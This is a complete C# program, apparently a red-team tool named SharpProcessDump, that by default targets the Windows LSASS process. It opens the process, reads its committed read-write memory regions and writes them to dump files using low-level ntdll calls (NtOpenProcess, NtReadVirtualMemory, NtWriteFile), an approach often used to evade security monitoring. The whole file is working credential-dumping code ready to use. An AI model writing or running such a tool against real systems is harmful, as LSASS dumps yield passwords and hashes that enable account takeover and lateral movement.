using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static SharpProcessDump.Win32;


namespace SharpProcessDump
{
    internal class Program
    {
        static void WriteToFile(byte[] buffer, int bufferSize, string filename)
        {
            // Create to file
            IntPtr hFile;
            UNICODE_STRING fname = new UNICODE_STRING();
            string current_dir = System.IO.Directory.GetCurrentDirectory();
            RtlInitUnicodeString(out fname, @"\??\" + current_dir + "\\" + filename);
            IntPtr objectName = Marshal.AllocHGlobal(Marshal.SizeOf(fname));
            Marshal.StructureToPtr(fname, objectName, true);
            OBJECT_ATTRIBUTES FileObjectAttributes = new OBJECT_ATTRIBUTES
            {
                Length = (int)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                ObjectName = objectName,
                Attributes = OBJ_CASE_INSENSITIVE,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = IntPtr.Zero
            };
            IO_STATUS_BLOCK IoStatusBlock = new IO_STATUS_BLOCK();
            long allocationSize = 0;
            uint ntstatus = NtCreateFile(
                out hFile,
                FileAccess_FILE_GENERIC_WRITE,
                ref FileObjectAttributes,
                ref IoStatusBlock,
                ref allocationSize,
                FileAttributes_Normal, // 0x80 = 128 https://learn.microsoft.com/es-es/dotnet/api/system.io.fileattributes?view=net-7.0
                FileShare_Write, // 2 - https://learn.microsoft.com/en-us/dotnet/api/system.io.fileshare?view=net-8.0
                CreationDisposition_FILE_OVERWRITE_IF, // 5 - https://code.googlesource.com/bauxite/+/master/sandbox/win/src/nt_internals.h
                CreateOptionFILE_SYNCHRONOUS_IO_NONALERT, // 32 -  https://code.googlesource.com/bauxite/+/master/sandbox/win/src/nt_internals.h
                IntPtr.Zero,
                0
            );
            if (ntstatus != 0) {
                Console.WriteLine("[-] Calling NtOpenFile failed.");
                Environment.Exit(0);
            }

            // Write to file
            ntstatus = NtWriteFile(hFile, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref IoStatusBlock, buffer, (uint)bufferSize, IntPtr.Zero, IntPtr.Zero);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Calling NtWriteFile failed.");
                Environment.Exit(0);
            }
        }


        static void Main(string[] args)
        {
            // Get process name
            string procname = "lsass";
            if (args.Length > 0) { 
                procname = args[0];
            }
            Console.WriteLine("[+] Dumping " + procname);

            //Get process PID
            Process[] process_list = Process.GetProcessesByName(procname);
            if (process_list.Length == 0)
            {
                Console.WriteLine("[-] Process " + procname + " not found.");
                Environment.Exit(0);
            }
            int processPID = process_list[0].Id;
            Console.WriteLine("[+] Process PID: " + processPID);

            // Get process handle with NtOpenProcess
            IntPtr processHandle = IntPtr.Zero;
            CLIENT_ID client_id = new CLIENT_ID();
            client_id.UniqueProcess = (IntPtr)processPID;
            client_id.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            uint ntstatus = NtOpenProcess(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
            Console.WriteLine("[+] Process handle: " + processHandle);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] NtOpenProcess failed. Do you have enough privileges for this process?");
                Environment.Exit(0);
            }

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr aux_address = IntPtr.Zero;
            byte[] aux_bytearray = {};
            while ((long)aux_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct calling VirtualQueryEx/NtQueryVirtualMemory
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                ntstatus = NtQueryVirtualMemory(processHandle, (IntPtr)aux_address, MemoryBasicInformation, out mbi, 0x30, out _);

                // If readable and commited --> Write memory region to a file
                if (mbi.Protect == PAGE_READWRITE && mbi.State == MEM_COMMIT)
                {
                    Console.WriteLine("[*] Dumping memory region 0x" + aux_address.ToString("X") + " (" + mbi.RegionSize + " bytes)");
                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                    string memdump_filename = procname + "_" + processPID + "_0x" + aux_address.ToString("X") + ".dmp";
                    WriteToFile(buffer, (int)mbi.RegionSize, memdump_filename);
                    byte[] new_bytearray = new byte[aux_bytearray.Length + buffer.Length];
                    Buffer.BlockCopy(aux_bytearray, 0, new_bytearray, 0, aux_bytearray.Length);
                    Buffer.BlockCopy(buffer, 0, new_bytearray, aux_bytearray.Length, buffer.Length);
                    aux_bytearray = new_bytearray;
                }

                // Next memory region
                aux_address = (IntPtr)((ulong)aux_address + (ulong)mbi.RegionSize);
            }

            // Get file name
            string dumpfile = procname + "_" + processPID + "_allinone.dmp";
            if (args.Length > 1)
            {
                dumpfile = args[1];
            }

            // Dump all byte arrays to one single file
            WriteToFile(aux_bytearray, aux_bytearray.Length, dumpfile);
        }
    }
}